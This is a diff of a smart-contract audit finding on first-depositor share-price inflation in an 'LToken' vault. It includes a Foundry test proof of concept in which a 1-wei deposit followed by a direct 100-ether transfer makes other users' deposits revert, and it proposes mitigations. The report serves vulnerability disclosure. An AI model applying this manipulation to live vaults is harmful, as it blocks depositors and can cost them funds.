@@ -1,22 +1,53 @@
 JohnSmith
-# Denial of Service by well funded first user
+# First user can set arbitrary price, which may prevent some users to deposit
 
-## [M] Denial of Service by well funded first user
+## [M] First user can set arbitrary price, which may prevent some users to deposit
 ### Problem
-First user can manipulate share price by sending tokens to the system externally.
-They can setup a front-running got which will deposit higher amount than legit users, preventing them to buy a single share.
-### Proof of Concept
-- Alice buys first share for 1 wei. Price of 1 share becomes 1 wei;
-- Alice runs a front-running bot, which reads mempool;
-- Bob deposits arbitrary amount, i.e. 100 ether;
-- Alice's bot sends transaction with higher fee to ERC.transfer(address,uint) to LToken vault 100 ether or more
-- Share price becomes 100 ether + 1wei or more;
-- Bob's transaction reverts because his amount sent is not enough to buy a single share;
-- Alice or her bot then can redeem assets;
-- As result nobody can deposit, and nothing to borrow;
+First user can set share price by sending tokens to the system externally, price can be very high. As result a lot of users will not be able to deposit.
+And borrowers will have smaller amount to borrow and higher interest rate to pay, because amount of underlying asset is smaller, because less amount of people are able to deposit.
 
-When Alice pays for gas, you pay for reputation damage.
+### Proof of Concept
+```solidity
+pragma solidity 0.8.15;
+
+import {TestBase} from "../utils/TestBase.sol";
+import "forge-std/console.sol";
+
+contract ProtocolTest is TestBase {
+    address public alice = cheats.addr(1);
+    address public bob = cheats.addr(2);
+
+    function setUp() public {
+        setupContracts();
+    }
+
+    function testSharePriceManipulation() public{
+        erc20.mint(address(alice), 1000 ether);
+        erc20.mint(address(bob), 1000 ether);
+        cheats.prank(alice);
+        erc20.approve(address(lErc20), type(uint256).max);
+        cheats.prank(bob);
+        erc20.approve(address(lErc20), type(uint256).max);
+
+        cheats.startPrank(alice);
+        lErc20.deposit(1, alice); // 1 share costs 1 wei now
+        assertEq(lErc20.previewRedeem(1), 1);
+
+        erc20.transfer(address(lErc20), 100 ether); // 1 share costs 100 ether + 1 wei now
+        cheats.stopPrank();
+
+        assertEq(lErc20.previewDeposit(80 ether), 0);
+        assertEq(lErc20.previewDeposit(100 ether + 1), 1);
+
+        //bob cannot deposit below share price which can be very expensive
+        cheats.expectRevert("ZERO_SHARES");
+        cheats.prank(bob);
+        lErc20.deposit(80 ether, bob);
+    }
+```
+
 ### Mitigation
-- Use Flashbots to avoid mempool.
-- Force users to deposit at least some amount in the LToken vault (Uniswap forces users to pay at least 1e18).
+Force users to deposit at least some amount in the LToken vault .
 That way the amount the attacker will need to ERC20.transfer to the system will be at least X * 1e18 instead of X which is unrealistic.
+An alternative is to require only the first depositor to freeze big enough initial amount of liquidity. This approach has been used long enough by various projects, for example in Uniswap V2
+
